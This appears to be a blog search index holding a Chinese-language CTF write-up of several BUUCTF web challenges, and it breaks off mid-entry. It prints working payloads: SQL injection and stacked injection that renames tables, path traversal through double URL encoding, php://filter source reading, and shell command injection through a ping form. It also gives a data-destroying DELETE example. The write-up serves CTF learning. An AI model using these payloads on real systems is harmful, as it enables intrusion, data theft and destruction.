<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/05/12/BUU-Web-page1/"/>
      <url>/2022/05/12/BUU-Web-page1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、-极客大挑2019-EasySQL1"><a href="#1、-极客大挑2019-EasySQL1" class="headerlink" title="1、[极客大挑2019]EasySQL1"></a>1、[极客大挑2019]EasySQL1</h1><p>看到SQL就想到先尝试万能密码</p><blockquote><p>1’ or 1=1#</p><p>解释：’是为了形成闭合语句，#为注释符(后面语句不再执行)</p><p>需要注意的是:</p><p>1.#可能会被URL自动进行编码导致语句错误</p><p>2.空格被过滤可以使用<code>/**/</code>绕过</p><p><em><u>解决：%23为#注释符的url编码</u></em></p><p>语句相当于：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">select * from table_name where username&#x3D;&#39;1&#39; or 1&#x3D;1 # &#39; and password&#x3D;&#39;xxxxxx&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-其实应该先简单判断是否存在注入点的"><a href="#2-其实应该先简单判断是否存在注入点的" class="headerlink" title="2.其实应该先简单判断是否存在注入点的"></a>2.其实应该先简单判断是否存在注入点的</h2><p>　如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为</p><blockquote><p><strong>单引号个数不匹配</strong></p></blockquote><p>而报错。</p><h2 id="3第三步、利用order-by查表的列数"><a href="#3第三步、利用order-by查表的列数" class="headerlink" title="3第三步、利用order by查表的列数"></a>3<em><strong>第三步、利用order by查表的列数</strong></em></h2><p><code>payload：username=1&#39; order by 3%23&amp;password=123（NO,Wrong username password！！！）</code><br><code>payload：username=1&#39; order by 4%23&amp;password=123（Unknown column &#39;4&#39; in &#39;order clause&#39;）</code><br><code>说明表只有三列</code></p><h4 id="4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"><a href="#4-第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）" class="headerlink" title="4.第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）"></a>4.<em><strong>第四步、如有回显，找到回显位（回显，就是显示正在执行的批处理命令及执行的结果等）</strong></em></h4><blockquote><p>payload：username=1’ union select 1,2,3%23&amp;password=123</p></blockquote><h2 id="法二：两处判断都绕过"><a href="#法二：两处判断都绕过" class="headerlink" title="法二：两处判断都绕过"></a>法二：两处判断都绕过</h2><p>使用两次<code>&#39;or 1=1#</code></p><p><code>?username=1&#39;or 1=1%23&amp;password=1&#39; or 1=1%23</code></p><p>[(70条消息) CTF-BUUCTF-<a href="https://blog.csdn.net/qq_42404383/article/details/103688509?ops_request_misc=%7B%22request_id%22:%22165054871516780264049295%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165054871516780264049295&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-103688509.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BHCTF+2018%5DWarmUp+1&spm=1018.2226.3001.4187">HCTF 2018]WarmUp_黑仔丶的博客-CSDN博客_buuctf的warmup题</a></p><h1 id="2、-HCTF-2018-WarmUp"><a href="#2、-HCTF-2018-WarmUp" class="headerlink" title="2、[HCTF 2018]WarmUp"></a>2、[HCTF 2018]WarmUp</h1><blockquote><p>F12提示source.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>   <span class="token comment">//传入了变量page，也就是我们刚刚传进来的file</span>  <span class="token punctuation">&#123;</span>  <span class="token comment">// 这里定义了白名单</span>      <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">/*为了返回 true 两个条件必须满足      1 page存在       2 page是字符串 ，      这里和外层的判断file 一致基本是再次判断了一遍*/</span>          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，白名单过滤，需要返回了ture所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>           <span class="token variable">$page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">//这里和上面类似 查看_page 是否在白名单中</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里发现对_page进行了一次decode解码，</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token comment">//获取两个？？之间的内容</span>          <span class="token variable">$_page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 这里是我们要绕过的点，从这里往上看 尝试构造</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//白名单</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token operator">*</span>必须满足<span class="token keyword">if</span>条件，才能包含file，这里也可以猜到可能考的是文件包含： <span class="token number">1</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>不为空 <span class="token number">2</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>是字符串 <span class="token number">3</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 为ture，回到checkFile 函数分析如何返回<span class="token constant boolean">true</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token delimiter important">?></span></span>可以看到函数代码中有四个if语句第一个if语句对变量进行检验，要求$page为字符串，否则返回false第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中'?'前部分，存在则返回true第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true若以上四个if语句均未返回值，则返回false有三个if语句可以返回true，第二个语句直接判断$page，不可用第三个语句截取'?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为'?'，仍可通过第四个if语句校验。（'?'两次编码值为'%253f'）,构造url：所以我们的payload 就是file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p><code>source.php?file=source.php%253f../../../../../ffffllllaaaagggg</code></p><blockquote><p>解释：</p><p>1、PHP $_REQUEST</p><p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p><p>2、?两次url编码后为：%253f</p><p>3、../../../../../猜测：根据ffffllllaaaagggg有四层的原因</p></blockquote><p>3、[极客大挑战 2019]Havefun</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc&#123;cat_cat_cat_cat&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload:?cat=dog</p><p>注意：不能写成?cat=’dog’（猜测可能被当做字符参数被解析）</p></blockquote><h1 id="3、-ACTF2020-新生赛-Include"><a href="#3、-ACTF2020-新生赛-Include" class="headerlink" title="3、[ACTF2020 新生赛]Include"></a>3、[ACTF2020 新生赛]Include</h1><blockquote><p>只有：Can you find out the flag?</p></blockquote><p>源码也没有提示</p><p>无思路了，查询</p><p>主要思路：</p><p><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-387051.html">PHP中filter协议详解</a></p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用</a></p><p>读取源文件，并用base编码，绕过</p><p>base64编码结果为：</p><p><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzQ2NTQwYTAtMTI1MS00OGNmLTkyOWItODQ0NDVmMjc0ZTk4fQo=</code></p><p>解码后为：</p><p><code>&lt;?php echo &quot;Can you find out the flag?&quot;; //flag&#123;346540a0-1251-48cf-929b-84445f274e98&#125;</code></p></blockquote><p>可以看出：flag为注释内容，也就可以解释了，编码后可以看到完整源码</p><h1 id="4、-强网杯-2019-随便注"><a href="#4、-强网杯-2019-随便注" class="headerlink" title="4、[强网杯 2019]随便注"></a>4、[强网杯 2019]随便注</h1><h2 id="sql堆叠注入知识"><a href="#sql堆叠注入知识" class="headerlink" title="sql堆叠注入知识"></a>sql堆叠注入知识</h2><p>堆叠注入原理：</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p><a href="https://www.zhaoj.in/read-5873.html#0x04">解题具体步骤</a></p><p>思路总结：</p><blockquote><p>1.先判断有无注入点<br><code>输入1，回显错误；</code></p><p>`输入1#，正常回显；（说明存在sql注入）；</p><p><code>输入1&#39; or &#39;1&#39;=&#39;1（不进行注释#，依旧回显正常，证明判断正确）</code></p><p>2.判断字段<br><code>1&#39; order by 3 #（1、2均正确，3回显错误，说明有两个字段）《是不是说明了有两个回显位呢？》</code></p><p>3.继续查询<br><code>1&#39; union select 1,2#</code>回显错误返回：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);(正则匹配，过滤关键词)，到这里已经能看出来了：很多查询关键字都被过滤了，正常方法是查不到了</code></p><p>4.(查询到了表和字段，但是默认查询表中并没有咱们想要的flag，因此，想要拿到flag必须让默认查询的表与字段和flag所在名匹配  )《此处也可以看出，人家给的第二个默认查询表words并不是没用的（需要知道它内部的名字）》<br>他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢</p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><blockquote><p><code>/?inject=1&#39;;RENAME TABLE </code>words<code>TO</code>words1<code>;RENAME TABLE </code>1919810931114514<code>TO</code>words<code>;ALTER TABLE </code>words<code>CHANGE</code>flag<code> </code>id<code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p><p>改完后，默认查询id=1，就可以查到了</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payload:<span class="token number">1</span><span class="token string">' or 1 ='</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5、-ACTF2020-新生赛-Exec"><a href="#5、-ACTF2020-新生赛-Exec" class="headerlink" title="5、[ACTF2020 新生赛]Exec"></a>5、[ACTF2020 新生赛]Exec</h1><p><em><strong><u>给了一个ping的输入框</u></strong></em></p><blockquote><p>php模拟我们常用的DOS命令的ping命令方法，主要用到的是php的**<u>内置函数</u>**exec来调用系统的ping命令,从而实现ping命令功能。 </p><p>从而想到通过exec函数来进行RCE。 </p></blockquote><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a><code>知识点：</code></h2><p><code>注意使用exec函数必须需要服务器支持调用系统内置函数才行。另外也可以使用system等php内置函数来实现这个功能</code></p><p><code>exec执行一个外部程序</code></p><p><code>执行给予的命令command，不过它并不会输出任何东西，它简单的从命令的结果中传回最后一行，如果你需要去执行一个命令，并且从命令去取得所有资料时，可以使用passthru()这个函数。</code></p><p><code>system---执行外部程式并且显示输出</code></p><p><code>system()执行给予的命令command，并且输出结果。如果有给予参数return_var，则执行命令的状态码将会写到这个变量。</code></p><p><code>注意:如果你允许来自使用者输入的资料，可以传递到此函数，那么你应该使用escapeshellcmd()来确定此使用者无法哄骗(trick)系统来执行武断的(arbitrary)命令。</code></p><p><code>注意:如果你使用此函数来启动一个程式，而且希望在背景里(background)执行的时候离开它，你必须确定此程式的输出是转向(redirected)到一个文件或是一些输出的资料流，否则PHP将会悬挂(hang)直到程式执行结束。</code></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment">;前面和后面命令都要执行，无论前面真假</span>|直接执行后面的语句||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句&amp;前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">aaa ; cat /flag(cat flag错误，猜测：/可能是查找所有目录下的flag)aaa | cat /flagaaa ||cat /flagaaa &amp; cat /flag127.0.0.1 &amp;&amp; cat /flag(执行无flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_46918279/article/details/120243396?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165128968616782184694889%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165128968616782184694889&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-120243396.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BACTF2020+%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec+1&spm=1018.2226.3001.4187">参考</a></p><p><a href="https://www.cnblogs.com/nerrissa/articles/4929462.html">php命令exec</a></p><h1 id="6、-SUCTF-2019-EasySQL"><a href="#6、-SUCTF-2019-EasySQL" class="headerlink" title="6、[SUCTF 2019]EasySQL"></a>6、[SUCTF 2019]EasySQL</h1><h2 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h2><p><a href="https://www.php.cn/php-weizijiaocheng-254981.html">PHP短路运算符</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"国士无双，您一路走好，坚信未来也一定满是赤旗的世界"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//转换类型为bool型，a=1，b被短路</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//bool不参与数值运算</span>    <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">//1 21</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/u014029795/article/details/105241226?ops_request_misc=%7B%22request_id%22:%22165130361716782390589859%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165130361716782390589859&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-105241226.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BSUCTF+2019%5DEasySQL+1&spm=1018.2226.3001.4187"> 加深理解</a></p><p><a href="https://blog.csdn.net/StevenOnesir/article/details/110203051?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=1">高级思路打击</a></p><h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><h3 id="第一种：手工盲注"><a href="#第一种：手工盲注" class="headerlink" title="第一种：手工盲注"></a>第一种：手工盲注</h3><blockquote><p>他的后端既然能做到<strong>数字回显</strong>==<u><strong>字母不回显</strong></u>==，说明有一个 ==或== 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。<br>所以猜测后端：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name type-declaration">select</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">flag</span> from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>结合：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>数字可以回显，字母不可以</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a<span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'|id from test'</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>字母字符均不可以</p></blockquote><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><p><code>*,1</code></p><p>相当于</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> Flag<span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> Flag语句含义：从Flag表中，查询所有字段，以及将最后一个字段值显示为<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="第二种：堆叠注入"><a href="#第二种：堆叠注入" class="headerlink" title="第二种：堆叠注入"></a>第二种：<strong>堆叠注入</strong></h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><p>看一个<code>writeup</code>上说，第一种解法是非预期解，预期解应该是<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>。<br>听都没听过，去查了下<code>set sql_mode=PIPES_AS_CONCAT</code>，用来处理<code>|</code>的符号的，将<code>或</code>操作改成<code>连接</code>操作。</p><h1 id="7、-极客大挑战-2019-Secret-File1"><a href="#7、-极客大挑战-2019-Secret-File1" class="headerlink" title="7、[极客大挑战 2019]Secret File1"></a>7、[极客大挑战 2019]Secret File1</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><blockquote><h1 id="你想知道蒋璐源的秘密么？"><a href="#你想知道蒋璐源的秘密么？" class="headerlink" title="你想知道蒋璐源的秘密么？"></a>你想知道蒋璐源的秘密么？</h1><p>想要的话可以给你，去找吧！把一切都放在那里了！</p></blockquote><p>F12看源码</p><blockquote><p><code>href=&quot;./Archive_room.php&quot;</code></p></blockquote><p>去看看</p><blockquote><h1 id="我把他们都放在这里了，去看看吧"><a href="#我把他们都放在这里了，去看看吧" class="headerlink" title="我把他们都放在这里了，去看看吧"></a>我把他们都放在这里了，去看看吧</h1><p><a href="http://b3d20ddb-6910-453b-9b82-04aa6ecfc653.node4.buuoj.cn:81/action.php">             SECRET         </a></p><p>Syclover @ cl4y</p></blockquote><blockquote><h1 